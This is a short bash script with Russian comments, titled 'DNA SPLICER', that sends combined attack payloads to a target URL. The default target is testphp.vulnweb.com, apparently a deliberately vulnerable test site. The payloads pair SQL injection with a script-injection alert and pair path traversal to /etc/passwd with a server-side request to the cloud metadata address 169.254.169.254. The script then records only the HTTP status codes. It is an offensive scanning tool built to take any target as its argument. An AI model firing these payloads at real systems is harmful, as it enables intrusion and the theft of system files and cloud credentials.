#!/bin/bash
TARGET=${1:-"http://testphp.vulnweb.com"}
echo "╔══════════════════════════════════════════════╗"
echo "║   🧬 DNA SPLICER — Гибридные атаки         ║"
echo "╚══════════════════════════════════════════════╝"
echo ""

# Скрещиваем два вектора в один
echo "[DNA] 🧬 Скрещиваю SQLi + XSS..."
SPLICED="${TARGET}?id=' OR '1'='1<script>alert(1)</script>"
code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$SPLICED" 2>/dev/null)
echo "  🧬 SQLi+XSS гибрид: HTTP $code"

echo "[DNA] 🧬 Скрещиваю LFI + SSRF..."
SPLICED="${TARGET}?file=../../etc/passwd&url=http://169.254.169.254/"
code=$(curl -sk --max-time 5 -o /dev/null -w "%{http_code}" "$SPLICED" 2>/dev/null)
echo "  🧬 LFI+SSRF гибрид: HTTP $code"

echo "[DNA] 🧬 Генерация новых гибридов завершена"
